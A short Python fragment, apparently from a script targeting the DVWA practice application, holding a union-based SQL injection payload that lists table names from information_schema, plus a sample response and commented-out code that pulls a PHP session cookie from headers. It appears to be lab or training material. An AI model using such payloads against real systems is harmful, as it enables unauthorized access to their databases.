import re

p="ID: 0 union SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=0x64767761 order by rand() limit 1 -- -First name: usersSurname: dvwa"
# session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
# session_id = session_id.group(1)
# print ("[i] session_id: %s" % session_id)
